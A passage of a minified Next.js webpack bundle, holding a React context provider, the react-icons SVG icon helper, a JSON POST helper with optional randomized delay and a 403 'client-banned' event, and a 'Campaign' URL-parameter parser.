            window.addEventListener("beforeunload", t)
        }
        let m = (0,
        s.createContext)(d)
          , u = () => (0,
        s.useContext)(m)
          , x = e => {
            let {children: t} = e;
            return (0,
            a.jsx)(m.Provider, {
                value: d,
                children: t
            })
        }
    },
    4575: function() {},
    1810: function(e, t, r) {
        "use strict";
        r.d(t, {
            w_: function() {
                return d
            }
        });
        var a = r(2265)
          , s = {
            color: void 0,
            size: void 0,
            className: void 0,
            style: void 0,
            attr: void 0
        }
          , o = a.createContext && a.createContext(s)
          , l = ["attr", "size", "title"];
        function n() {
            return (n = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var r = arguments[t];
                    for (var a in r)
                        Object.prototype.hasOwnProperty.call(r, a) && (e[a] = r[a])
                }
                return e
            }
            ).apply(this, arguments)
        }
        function i(e, t) {
            var r = Object.keys(e);
            if (Object.getOwnPropertySymbols) {
                var a = Object.getOwnPropertySymbols(e);
                t && (a = a.filter(function(t) {
                    return Object.getOwnPropertyDescriptor(e, t).enumerable
                })),
                r.push.apply(r, a)
            }
            return r
        }
        function c(e) {
            for (var t = 1; t < arguments.length; t++) {
                var r = null != arguments[t] ? arguments[t] : {};
                t % 2 ? i(Object(r), !0).forEach(function(t) {
                    var a, s;
                    a = t,
                    s = r[t],
                    (a = function(e) {
                        var t = function(e, t) {
                            if ("object" != typeof e || !e)
                                return e;
                            var r = e[Symbol.toPrimitive];
                            if (void 0 !== r) {
                                var a = r.call(e, t || "default");
                                if ("object" != typeof a)
                                    return a;
                                throw TypeError("@@toPrimitive must return a primitive value.")
                            }
                            return ("string" === t ? String : Number)(e)
                        }(e, "string");
                        return "symbol" == typeof t ? t : t + ""
                    }(a))in e ? Object.defineProperty(e, a, {
                        value: s,
                        enumerable: !0,
                        configurable: !0,
                        writable: !0
                    }) : e[a] = s
                }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : i(Object(r)).forEach(function(t) {
                    Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t))
                })
            }
            return e
        }
        function d(e) {
            return t => a.createElement(m, n({
                attr: c({}, e.attr)
            }, t), function e(t) {
                return t && t.map( (t, r) => a.createElement(t.tag, c({
                    key: r
                }, t.attr), e(t.child)))
            }(e.child))
        }
        function m(e) {
            var t = t => {
                var r, {attr: s, size: o, title: i} = e, d = function(e, t) {
                    if (null == e)
                        return {};
                    var r, a, s = function(e, t) {
                        if (null == e)
                            return {};
                        var r = {};
                        for (var a in e)
                            if (Object.prototype.hasOwnProperty.call(e, a)) {
                                if (t.indexOf(a) >= 0)
                                    continue;
                                r[a] = e[a]
                            }
                        return r
                    }(e, t);
                    if (Object.getOwnPropertySymbols) {
                        var o = Object.getOwnPropertySymbols(e);
                        for (a = 0; a < o.length; a++)
                            r = o[a],
                            !(t.indexOf(r) >= 0) && Object.prototype.propertyIsEnumerable.call(e, r) && (s[r] = e[r])
                    }
                    return s
                }(e, l), m = o || t.size || "1em";
                return t.className && (r = t.className),
                e.className && (r = (r ? r + " " : "") + e.className),
                a.createElement("svg", n({
                    stroke: "currentColor",
                    fill: "currentColor",
                    strokeWidth: "0"
                }, t.attr, s, d, {
                    className: r,
                    style: c(c({
                        color: e.color || t.color
                    }, t.style), e.style),
                    height: m,
                    width: m,
                    xmlns: "http://www.w3.org/2000/svg"
                }), i && a.createElement("title", null, i), e.children)
            }
            ;
            return void 0 !== o ? a.createElement(o.Consumer, null, e => t(e)) : t(s)
        }
    },
    1517: function(e, t, r) {
        "use strict";
        r.d(t, {
            ZS: function() {
                return o
            },
            iq: function() {
                return a
            }
        });
        let a = async e => {
            let {url: t, data: r, signal: a, loadingDurations: s=[1e3, 2e3, 3e3], delay: o=!0} = e;
            return new Promise(async e => {
                let l = await fetch(t, {
                    method: "POST",
                    signal: a,
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(r)
                });
                (null == l ? void 0 : l.status) === 403 && window.dispatchEvent(new CustomEvent("client-banned")),
                o ? setTimeout( () => {
                    e(l)
                }
                , s[Math.floor(Math.random() * s.length)]) : e(l)
            }
            )
        }
          , s = e => {
            if (null == e)
                return null;
            let t = String(e).trim();
            if (!t)
                return null;
            let r = t.toLowerCase();
            if ("null" === r || "undefined" === r)
                return null;
            let a = Number(t);
            return Number.isFinite(a) ? a : null
        }
          , o = e => {
            if ("string" != typeof e)
                return null;
            try {
                var t;
                let r = new URLSearchParams(e);
                return s(null !== (t = r.get("Campaign")) && void 0 !== t ? t : r.get("campaign"))
            } catch (e) {
                return null
            }
        }
    }
}, function(e) {
    e.O(0, [223, 699, 40, 971, 23, 744], function() {
        return e(e.s = 4783)
    }),
    _N_E = e.O()
}
]);
